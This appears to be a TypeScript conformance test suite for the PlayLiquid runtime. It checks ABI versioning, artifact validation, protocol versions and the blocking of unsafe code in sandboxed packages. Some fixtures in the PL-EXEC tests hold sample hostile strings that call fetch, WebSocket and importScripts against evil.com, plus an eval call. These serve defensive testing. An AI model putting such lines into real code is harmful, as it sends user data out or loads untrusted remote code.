// ════════════════════════════════════════════════════════════════
// PLAYLIQUID CONFORMANCE SUITE
// ════════════════════════════════════════════════════════════════
//
// R0: Automated conformance tests that prove architectural properties
// through actual runtime behavior — not UI claims.
//
// Each test returns { name, passed, detail }.
// The suite is run via /api/conformance/run.

import { validateDeclarativeArtifact, createDeclarativeImplementation } from "./declarative-artifact";
import { validateExecutableArtifact } from "./executable-artifact";
import { isCompatible, PROTOCOL_VERSIONS, versionString } from "./protocol-versions";

export interface ConformanceResult {
  name: string;
  passed: boolean;
  detail: string;
  duration?: number;
}

export interface ConformanceSuite {
  totalTests: number;
  passed: number;
  failed: number;
  results: ConformanceResult[];
}

// ── PL-ABI: Package Runtime ABI conformance ───────────────────────

function testAbiVersionCompatibility(): ConformanceResult {
  // An artifact with abiVersion "1.0.0" must be compatible with runtime v1.0.0
  const compat = isCompatible("1.0.0", PROTOCOL_VERSIONS.packageABI);
  return {
    name: "PL-ABI-01: Compatible version accepted",
    passed: compat.compatible,
    detail: compat.reason ?? "v1.0.0 artifact accepted by v1.0.0 runtime",
  };
}

function testAbiVersionRejection(): ConformanceResult {
  // An artifact with abiVersion "2.0.0" must be REJECTED (major version mismatch)
  const compat = isCompatible("2.0.0", PROTOCOL_VERSIONS.packageABI);
  return {
    name: "PL-ABI-02: Incompatible version rejected",
    passed: !compat.compatible,
    detail: compat.reason ?? "v2.0.0 should be rejected by v1.0.0 runtime",
  };
}

function testAbiMissingVersion(): ConformanceResult {
  // An artifact without abiVersion must be rejected
  const validation = validateDeclarativeArtifact({
    name: "test",
    displayName: "Test",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: {},
  });
  return {
    name: "PL-ABI-03: Missing abiVersion rejected",
    passed: !validation.valid && validation.errors.some((e) => e.includes("abiVersion")),
    detail: validation.errors.join("; "),
  };
}

function testArtifactValidation(): ConformanceResult {
  // A valid declarative artifact must pass validation
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/valid-package",
    displayName: "Valid Package",
    family: "building",
    capabilities: ["test.cap"],
    provides: ["test.provides"],
    requires: [],
    initialState: { value: 0 },
    update: { behavior: "static", params: {} },
    render: { behavior: "shape", params: { shape: "box", size: 10, color: "#ff0000" } },
  };
  const validation = validateDeclarativeArtifact(artifact);
  return {
    name: "PL-ABI-04: Valid artifact passes validation",
    passed: validation.valid,
    detail: validation.errors.join("; ") || validation.warnings.join("; ") || "passed",
  };
}

function testInvalidShapeRejected(): ConformanceResult {
  // An artifact with an invalid render shape must be rejected
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/bad-shape",
    displayName: "Bad Shape",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: {},
    render: { behavior: "shape", params: { shape: "hexagon", size: 10, color: "#fff" } },
  };
  const validation = validateDeclarativeArtifact(artifact);
  return {
    name: "PL-ABI-05: Invalid render shape rejected",
    passed: !validation.valid && validation.errors.some((e) => e.includes("Invalid render shape")),
    detail: validation.errors.join("; "),
  };
}

function testInstanceIsolation(): ConformanceResult {
  // createInstance() must return independent instances
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/isolation-test",
    displayName: "Isolation Test",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: { rotation: 0 },
    update: { behavior: "spin", params: { spinSpeed: 0.1 } },
    render: { behavior: "shape", params: { shape: "box", size: 8, color: "#00ff00" } },
  };
  const validation = validateDeclarativeArtifact(artifact);
  if (!validation.valid || !validation.artifact) {
    return { name: "PL-ABI-06: Instance isolation", passed: false, detail: "artifact validation failed" };
  }
  const impl = createDeclarativeImplementation(validation.artifact);
  const inst1 = impl.createInstance();
  const inst2 = impl.createInstance();
  return {
    name: "PL-ABI-06: createInstance() returns independent instances",
    passed: inst1 !== inst2,
    detail: inst1 !== inst2 ? "two distinct instances created" : "same instance returned",
  };
}

// ── PL-PACKAGE: Generic package execution ─────────────────────────

function testAlienPackageNoRegistry(): ConformanceResult {
  // An artifact with a completely novel name must be executable through
  // createDeclarativeImplementation — no registry lookup needed.
  const artifact = {
    abiVersion: "1.0.0",
    name: "@external/acme/quantum-gardener",
    displayName: "Quantum Gardener",
    family: "creature",
    capabilities: ["garden.prune"],
    provides: ["garden.plant"],
    requires: [],
    initialState: { growth: 0 },
    update: { behavior: "pulse", params: { pulseRate: 0.05 } },
    render: { behavior: "shape", params: { shape: "diamond", size: 14, color: "#22d3ee" } },
    onClick: { behavior: "requestCapability", params: { capability: "garden.prune" } },
  };
  const validation = validateDeclarativeArtifact(artifact);
  if (!validation.valid || !validation.artifact) {
    return { name: "PL-PKG-01: Alien package executable without registry", passed: false, detail: "validation failed" };
  }
  const impl = createDeclarativeImplementation(validation.artifact);
  const instance = impl.createInstance();
  return {
    name: "PL-PKG-01: Alien package executable without registry",
    passed: impl !== null && instance !== null && impl.target === "playliquid-web",
    detail: `@external/acme/quantum-gardener → impl.target=${impl.target}, instance created`,
  };
}

function test3DShapesSupported(): ConformanceResult {
  // 3D shapes (box, sphere, cylinder, cone) must be valid
  const shapes = ["box", "sphere", "cylinder", "cone"];
  const results = shapes.map((shape) => {
    const artifact = {
      abiVersion: "1.0.0",
      name: `@test/shape-${shape}`,
      displayName: `Shape ${shape}`,
      family: "building",
      capabilities: [],
      provides: [],
      requires: [],
      initialState: {},
      render: { behavior: "shape", params: { shape, size: 5, color: "#fff" } },
    };
    const v = validateDeclarativeArtifact(artifact);
    return { shape, valid: v.valid };
  });
  const allValid = results.every((r) => r.valid);
  return {
    name: "PL-PKG-02: 3D shapes (box, sphere, cylinder, cone) accepted",
    passed: allValid,
    detail: results.map((r) => `${r.shape}=${r.valid ? "✓" : "✗"}`).join(", "),
  };
}

// ── PL-PROTOCOL: Protocol versioning ──────────────────────────────

function testProtocolVersionsDefined(): ConformanceResult {
  const required = ["playliquid", "packageABI", "worldScene", "spatialAnchor", "capability", "runtimeArtifact", "worldBuild", "stateSync", "event", "serviceContract", "coordinateSystem"];
  const missing = required.filter((k) => !PROTOCOL_VERSIONS[k as keyof typeof PROTOCOL_VERSIONS]);
  return {
    name: "PL-PROTO-01: All protocol versions defined",
    passed: missing.length === 0,
    detail: missing.length === 0 ? `All ${required.length} protocols versioned` : `Missing: ${missing.join(", ")}`,
  };
}

function testProtocolMajorVersionIs1(): ConformanceResult {
  const allV1 = Object.entries(PROTOCOL_VERSIONS).every(([, v]) => v.major === 1);
  return {
    name: "PL-PROTO-02: All protocols at major version 1",
    passed: allV1,
    detail: allV1 ? "All protocols v1.x.x" : "Some protocols not v1",
  };
}

function testVersionStringFormat(): ConformanceResult {
  const vs = versionString(PROTOCOL_VERSIONS.packageABI);
  const valid = /^\d+\.\d+\.\d+$/.test(vs);
  return {
    name: "PL-PROTO-03: Version string format is X.Y.Z",
    passed: valid,
    detail: `packageABI version = "${vs}"`,
  };
}

// ── PL-SECURITY: Certification and security ───────────────────────

function testInvalidArtifactRejected(): ConformanceResult {
  // An artifact with invalid JSON structure must be rejected
  const validation = validateDeclarativeArtifact("not valid json");
  return {
    name: "PL-SEC-01: Invalid JSON artifact rejected",
    passed: !validation.valid,
    detail: validation.errors.join("; "),
  };
}

function testMissingFieldsRejected(): ConformanceResult {
  // An artifact missing required fields must be rejected
  const validation = validateDeclarativeArtifact({
    abiVersion: "1.0.0",
    // missing name, displayName, family, etc.
  });
  return {
    name: "PL-SEC-02: Missing required fields rejected",
    passed: !validation.valid && validation.errors.length > 3,
    detail: `${validation.errors.length} errors: ${validation.errors.slice(0, 3).join("; ")}...`,
  };
}

function testIncompatibleVersionRejected(): ConformanceResult {
  // An artifact with abiVersion "3.0.0" must be rejected
  const artifact = {
    abiVersion: "3.0.0",
    name: "@test/future-package",
    displayName: "Future Package",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: {},
    render: { behavior: "shape", params: { shape: "box", size: 10, color: "#fff" } },
  };
  const validation = validateDeclarativeArtifact(artifact);
  return {
    name: "PL-SEC-03: Incompatible protocol version rejected",
    passed: !validation.valid && validation.errors.some((e) => e.includes("Protocol incompatibility")),
    detail: validation.errors.join("; "),
  };
}

// ── PL-EXEC: Sandboxed executable packages (R1 Tier B) ────────────

function testExecutableArtifactValidation(): ConformanceResult {
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/executable-test",
    displayName: "Executable Test",
    family: "creature",
    capabilities: ["test.cap"],
    provides: ["test.provides"],
    requires: [],
    initialState: { x: 0 },
    code: "function userUpdate(delta) { state.x += delta; }",
  };
  const validation = validateExecutableArtifact(artifact);
  return {
    name: "PL-EXEC-01: Valid executable artifact passes validation",
    passed: validation.valid,
    detail: validation.errors.join("; ") || "passed",
  };
}

function testExecutableFetchBlocked(): ConformanceResult {
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/malicious-fetch",
    displayName: "Malicious Fetch",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: {},
    code: "function userUpdate() { fetch('https://evil.com/steal'); }",
  };
  const validation = validateExecutableArtifact(artifact);
  return {
    name: "PL-EXEC-02: fetch() in executable artifact blocked",
    passed: !validation.valid && validation.errors.some((e) => e.includes("fetch")),
    detail: validation.errors.join("; "),
  };
}

function testExecutableWebSocketBlocked(): ConformanceResult {
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/malicious-ws",
    displayName: "Malicious WS",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: {},
    code: "function userUpdate() { new WebSocket('wss://evil.com'); }",
  };
  const validation = validateExecutableArtifact(artifact);
  return {
    name: "PL-EXEC-03: WebSocket in executable artifact blocked",
    passed: !validation.valid && validation.errors.some((e) => e.includes("WebSocket")),
    detail: validation.errors.join("; "),
  };
}

function testExecutableEvalBlocked(): ConformanceResult {
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/malicious-eval",
    displayName: "Malicious Eval",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: {},
    code: "function userUpdate() { eval('malicious code'); }",
  };
  const validation = validateExecutableArtifact(artifact);
  return {
    name: "PL-EXEC-04: eval() in executable artifact blocked",
    passed: !validation.valid && validation.errors.some((e) => e.includes("eval")),
    detail: validation.errors.join("; "),
  };
}

function testExecutableImportScriptsBlocked(): ConformanceResult {
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/malicious-import",
    displayName: "Malicious Import",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: {},
    code: "function userUpdate() { importScripts('https://evil.com/code.js'); }",
  };
  const validation = validateExecutableArtifact(artifact);
  return {
    name: "PL-EXEC-05: importScripts() in executable artifact blocked",
    passed: !validation.valid && validation.errors.some((e) => e.includes("importScripts")),
    detail: validation.errors.join("; "),
  };
}

function testExecutableMissingCode(): ConformanceResult {
  const artifact = {
    abiVersion: "1.0.0",
    name: "@test/no-code",
    displayName: "No Code",
    family: "building",
    capabilities: [],
    provides: [],
    requires: [],
    initialState: {},
  };
  const validation = validateExecutableArtifact(artifact);
  return {
    name: "PL-EXEC-06: Missing code field rejected",
    passed: !validation.valid && validation.errors.some((e) => e.includes("code")),
    detail: validation.errors.join("; "),
  };
}

// ── Run the full suite ────────────────────────────────────────────

export function runConformanceSuite(): ConformanceSuite {
  const tests: Array<() => ConformanceResult> = [
    // PL-ABI
    testAbiVersionCompatibility,
    testAbiVersionRejection,
    testAbiMissingVersion,
    testArtifactValidation,
    testInvalidShapeRejected,
    testInstanceIsolation,
    // PL-PACKAGE
    testAlienPackageNoRegistry,
    test3DShapesSupported,
    // PL-PROTO
    testProtocolVersionsDefined,
    testProtocolMajorVersionIs1,
    testVersionStringFormat,
    // PL-SECURITY
    testInvalidArtifactRejected,
    testMissingFieldsRejected,
    testIncompatibleVersionRejected,
    // PL-EXEC (R1 Tier B — sandboxed executable packages)
    testExecutableArtifactValidation,
    testExecutableFetchBlocked,
    testExecutableWebSocketBlocked,
    testExecutableEvalBlocked,
    testExecutableImportScriptsBlocked,
    testExecutableMissingCode,
  ];

  const results = tests.map((test) => {
    try {
      return test();
    } catch (e) {
      return {
        name: test.name || "unknown",
        passed: false,
        detail: `Exception: ${e instanceof Error ? e.message : "unknown"}`,
      };
    }
  });

  const passed = results.filter((r) => r.passed).length;
  const failed = results.filter((r) => !r.passed).length;

  return {
    totalTests: results.length,
    passed,
    failed,
    results,
  };
}
